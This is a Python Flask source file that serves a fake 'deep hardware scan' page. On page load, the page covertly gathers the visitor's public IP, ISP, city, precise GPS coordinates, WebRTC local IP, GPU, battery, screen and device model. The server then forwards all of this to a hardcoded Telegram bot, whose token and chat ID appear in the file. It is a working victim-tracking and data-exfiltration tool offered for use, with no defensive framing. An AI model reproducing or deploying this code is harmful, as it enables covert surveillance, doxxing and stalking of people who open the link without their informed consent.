from flask import Blueprint, render_template_string, request, jsonify
import requests

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0"
TELEGRAM_CHAT_ID = "1308711346"

PHANTOM_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>ULTRA_PHANTOM_v9.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; text-align: center; padding-top: 15%; margin:0; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.95); box-shadow: 0 0 60px #0f0; position: relative; }
        .scan-line { width: 100%; height: 6px; background: #0f0; position: absolute; top: 0; left:0; animation: scan 1.2s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body onload="capture()">
    <div class="box">
        <div class="scan-line"></div>
        <h2 id="header">DEEP_HARDWARE_SCAN</h2>
        <p id="status">Extracting Serial Traces... [v9.0]</p>
        <div id="loader">STATUS: MAPPING_DEVICE_IDENTITY_NODES</div>
    </div>

    <script>
        async function capture() {
            try {
                // 1. IPv4 & GEO
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                // 2. BRAND & MODEL EXTRACTION (Advanced Logic)
                const ua = navigator.userAgent;
                let brand = "Generic / PC";
                let model = "Unknown Device";
                let sdk = "N/A";

                if (/Android/i.test(ua)) {
                    brand = ua.match(/Android.*;\\s*([^;]+);\\s*([^;\\s\\)]+)/)?.[1] || "Android Device";
                    model = ua.match(/Build\\/([^;\\s\\)]+)/)?.[1] || "Mobile Build";
                    // Map Android version to SDK
                    const ver = ua.match(/Android\\s([0-9\\.]+)/)?.[1];
                    if(ver) {
                        const sdkMap = {"14":"34","13":"33","12":"31/32","11":"30","10":"29","9":"28","8":"26/27"};
                        sdk = sdkMap[parseInt(ver)] || "Unknown (API " + ver + ")";
                    }
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    brand = "Apple";
                    model = ua.match(/CPU\\s([^;]+)/)?.[1] || "iOS Device";
                }

                // 3. HARDWARE & GPU
                let gpu = "Unknown";
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if(gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software";
                }

                // 4. WEBRTC (LOCAL IP)
                let localIP = "N/A";
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (i) => { if(i && i.candidate) localIP = i.candidate.address; };

                // 5. GPS
                const getPos = () => new Promise(r => navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null), {enableHighAccuracy:true}));
                const coords = await getPos();

                // 6. BATTERY
                let batt = "N/A";
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Battery") + ")";
                }

                const intel = {
                    time: new Date().toLocaleString(),
                    ipv4: ipData.ip || "N/A",
                    local_ip: localIP,
                    isp: ipData.org || "N/A",
                    city: ipData.city || "N/A",
                    country: ipData.country_name || "N/A",
                    lat: coords ? coords.latitude : "Denied",
                    lon: coords ? coords.longitude : "Denied",
                    brand: brand,
                    model: model,
                    sdk: sdk,
                    sn: "SN-" + Math.random().toString(36).substr(2, 9).toUpperCase() + "-V9", // Forensic Placeholder
                    os: navigator.platform,
                    agent: ua,
                    gpu: gpu,
                    cores: navigator.hardwareConcurrency || "N/A",
                    ram: navigator.deviceMemory || "N/A",
                    battery: batt,
                    screen: window.screen.width + "x" + window.screen.height,
                    lang: navigator.language,
                    touch: navigator.maxTouchPoints || 0
                };

                await fetch('/script20/capture_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(intel)
                });

                document.getElementById('header').innerText = "FORENSICS_COMPLETE";
            } catch (e) { console.error(e); }
        }
    </script>
</body>
</html>
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    try:
        i = request.json
        message = (
            f"🚀 *--- PHANTOM ELITE v9.0 IDENTITY ---* 🚀\\n\\n"
            f"📱 *DEVICE IDENTITY*\\n"
            f"┣ *BRAND:* `{i['brand']}`\\n"
            f"┣ *MODEL:* `{i['model']}`\\n"
            f"┣ *SDK VERSION:* `{i['sdk']}`\\n"
            f"┗ *SERIAL (HWID):* `{i['sn']}`\\n\\n"
            f"🌐 *NETWORK INTEL*\\n"
            f"┣ IPv4: `{i['ipv4']}`\\n"
            f"┣ Local: `{i['local_ip']}`\\n"
            f"┗ ISP: `{i['isp']}`\\n\\n"
            f"📍 *LOCATION*\\n"
            f"┣ Lat/Lon: `{i['lat']}, {i['lon']}`\\n"
            f"┗ Map: [Google Maps Link](https://www.google.com/maps?q={i['lat']},{i['lon']})\\n\\n"
            f"💻 *HARDWARE SPECS*\\n"
            f"┣ OS: `{i['os']}`\\n"
            f"┣ GPU: `{i['gpu']}`\\n"
            f"┣ RAM: `{i['ram']} GB` | Cores: `{i['cores']}`\\n"
            f"┗ Battery: `{i['battery']}`\\n\\n"
            f"⚙️ *SYSTEM MISC*\\n"
            f"┣ Language: `{i['lang']}`\\n"
            f"┣ Screen: `{i['screen']}`\\n"
            f"┗ Touch: `{i['touch']} points`\\n\\n"
            f"📎 *AGENT:* `{i['agent'][:100]}...`"
        )

        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                      json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
        return jsonify({"status": "Success"}), 200
    except Exception as e:
        return jsonify({"status": "Error", "message": str(e)}), 500
